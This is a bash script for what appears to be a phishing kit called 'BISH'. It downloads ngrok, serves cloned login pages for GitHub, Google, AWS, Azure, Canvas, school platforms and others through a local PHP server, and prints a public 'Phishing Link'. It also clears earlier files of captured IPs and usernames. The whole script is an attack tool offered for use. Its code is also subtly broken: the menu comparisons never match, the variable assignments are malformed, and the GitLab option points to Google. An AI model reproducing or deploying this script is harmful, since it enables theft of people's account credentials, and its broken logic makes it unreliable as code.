#!/bin/bash

red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
reset=`tput sgr0`


start_server() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi
if [[ -e sites/$server/usernames.txt ]]; then
rm -rf sites/$server/usernames.txt

fi


if [[ -e ngrok ]]; then
echo ""
else

printf "${green}Downloading Ngrok...${reset}\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
exit 1
fi



else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "${red}CRITICAL ERROR! ABORTING! (Err: UNABLE TO DOWNLOAD Ngrok)${reset} \n"
exit 1
fi
fi
fi

printf "${green}Starting Personal Home Page (PHP)...${reset} \n"
cd sites/$site && php -S 127.0.0.1:$port
sleep 2
printf "${green}Starting ngrok...${reset} \n"
./ngrok http $port
sleep 10

link=$( curl -S -n http://127.0.0.1:4040/api/tunnels | grep -oE "https:\/\/[a-z0-9\-]*\.ngrok\.io")
printf "${green}Phishing Link: \n" $link
check
}





require_root() {
  if [ "$(id -u)" != "0" ]; then
    printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: NOT root)${reset} \n \n" 1>&2
    exit 1
  fi
}


required_packages() {
command -v php > /dev/null || printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: php NOT INSTALLED)${reset} \n \n"
command -v curl > /dev/null|| printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: curl NOT INSTALLED)${reset} \n \n"
command -v unzip > /dev/null || printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: unzip NOT INSTALLED)${reset} \n \n"
command -v wget > /dev/null || printf "\n ${red}CRITICAL ERROR! ABORTING! (Err: wget NOT INSTALLED)${reset} \n \n"
}


disclaimer() {
printf "\n                ${red}DEVELOPERS HOLD NO LIABILLITY FOR MISUSE OF BISH${reset} \n \n"
}


options() {
clear
printf "\n \n      ${yellow}[§${green}GitHub${reset}${yellow}§]${reset}            ${yellow}[§${green}Google${reset}${yellow}§]${reset}          ${yellow}[§${green}GitLab${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}Replit${reset}${yellow}§]${reset}            ${yellow}[§${green}Skyward${reset}${yellow}§]${reset}         ${yellow}[§${green}LightSpeedSystems${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}PythonAnywhere${reset}${yellow}§]${reset}    ${yellow}[§${green}Linode${reset}${yellow}§]${reset}          ${yellow}[§${green}AWS${reset}${yellow}§]${reset} \n"
printf "      ${yellow}[§${green}MicrosoftAzure${reset}${yellow}§]${reset}    ${yellow}[§${green}DigitalOcean${reset}${yellow}§]${reset}    ${yellow}[§${green}Canvas${reset}${yellow}§]${reset} \n"


}

input() {
read -p "${yellow}Please choose an option $ ${reset}" user_choice
read -p "${yellow}Please enter a port number $ ${reset}" port
}

input_processing() {

if [ user_choice = "GitHub\n" ]; then
site = GitHub
start_server

elif [ user_choice = "Google\n" ]; then
site = Google
start_server

elif [ user_choice = "GitLab\n" ]; then
site = Google
start_server

elif [ user_choice = "Replit\n" ]; then
site = Replit
start_server

elif [ user_choice = "Skyward\n" ]; then
site = Skyward
start_server

elif [ user_choice = "LightSpeedSystems\n" ]; then
site = LightSpeedSystems
start_server

elif [ user_choice = "PythonAnywhere\n" ]; then
site = PythonAnywhere
start_server

elif [ user_choice = "Linode\n" ]; then
site = Linode
start_server

elif [ user_choice = "AWS\n" ]; then
site = AWS
start_server

elif [ user_choice = "MicrosoftAzure\n" ]; then
site = MicrosoftAzure
start_server

elif [ user_choice = "DigitalOcean\n" ]; then
site = DigitalOcean
start_server

elif [ user_choice = "Canvas\n" ]; then
site = Canvas
start_server

fi
}


# require_root
# required_packages
disclaimer
options
input
input_processing







